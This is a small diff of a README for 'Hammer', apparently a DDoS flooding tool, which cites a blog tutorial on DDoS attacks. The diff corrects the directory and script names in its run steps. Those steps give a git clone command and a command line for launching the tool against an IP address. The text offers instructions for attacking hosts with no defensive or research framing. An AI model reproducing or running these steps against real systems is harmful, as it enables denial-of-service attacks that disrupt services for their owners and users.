@@ -19,8 +19,8 @@ sc : https://santrisulsel.blogspot.com/2019/05/tutorial-cara-ddos-attack-hammer.
 - git clone https://github.com/cyweb/Hammer
 # How To Run? 
 :lock: Run! 
-- cd ddos-hammer
-- python3 hammer.py -s [ip Address] -t 135
+- cd Hammer
+- python3 Hammer.py -s [ip Address] -t 135
 
 Or
 
